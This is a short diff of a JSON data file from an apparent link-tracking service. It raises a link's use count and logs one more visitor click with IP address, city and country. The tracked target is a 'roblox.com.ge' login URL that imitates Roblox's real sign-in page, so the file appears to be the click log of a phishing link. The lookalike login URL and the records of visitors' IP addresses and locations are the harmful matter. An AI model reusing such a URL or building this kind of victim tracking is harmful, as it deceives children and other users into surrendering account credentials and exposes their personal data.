@@ -4,7 +4,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776493139088,
     "status": "active",
-    "useCount": 5,
+    "useCount": 6,
     "createdBy": "system",
     "clicks": [
       {
@@ -46,6 +46,14 @@
         "city": "Antwerp",
         "flag": "🇧🇪",
         "countryCode": "BE"
+      },
+      {
+        "timestamp": 1776594847758,
+        "ip": "173.252.95.10",
+        "country": "United States",
+        "city": "Altoona",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
